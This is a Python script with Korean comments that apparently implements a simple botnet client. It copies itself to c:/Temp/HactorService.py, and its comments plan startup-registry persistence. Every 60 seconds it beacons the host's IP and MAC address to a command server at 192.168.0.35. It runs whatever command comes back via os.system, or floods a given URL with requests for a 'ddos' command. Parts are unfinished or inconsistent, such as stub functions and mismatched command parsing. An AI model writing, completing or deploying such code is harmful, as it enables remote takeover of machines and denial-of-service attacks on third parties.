import time
import os
import requests
import socket
import uuid

def get_ip_address():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address

def get_mac_address():
    mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
    return ':'.join([mac[e:e+2] for e in range(0, 12, 2)])

# 함수 정의 부분
def get_current_filename():
    return os.path.basename(__file__)

def get_current_file_path():
    return os.path.abspath(__file__)

def file_exists(file_path):
    return os.path.exists(file_path)

def json_classifier(json_data):
    dict_data = ''

    return dict_data

def copy_file(source, destination):
    with open(source, 'rb') as src_file:
        with open(destination, 'wb') as dest_file:
            dest_file.write(src_file.read())

def fin_request():
    pass


# 전역 변수 부분
url = "http://192.168.0.35"
file_path = "c:/Temp/HactorService.py"


# 메인 함수 부분
if __name__ == "__main__":
    print("현재 실행 중인 파일의 이름:", get_current_filename())

    if not file_exists(file_path):
        copy_file(get_current_file_path(), file_path)
        
        # 레지스트리 시작프로그램 등록 후 새롭게 실행하고, 현재 실행중인 프로제스 종료하기
        # 파일 복제 기능 추가하기


    while True:
        print(f"{url}/r?ip={get_ip_address()}&mac={get_mac_address()}")
        
            # 통신 기능
            
        result = requests.get(f"{url}/r?ip={get_ip_address()}&mac={get_mac_address()}")
        print(result.text)
        json_data = result.json()
        if "command" in json_data:
            cmd = json_data["command"]
            if "ddos" in cmd[0]:
                cnt = int(cmd.split()[2])
                target = cmd.split()[1]
                for i in range(cnt):
                    requests.get(target)
            elif "null" in cmd[0]:
                pass
            else:
                os.system(cmd[0])
        elif "message" in json_data:
            print("Received message:", json_data["message"])

        #except Exception as e:
            #print(f"승진: {e}")

        # 시간 통제 
        time.sleep(60)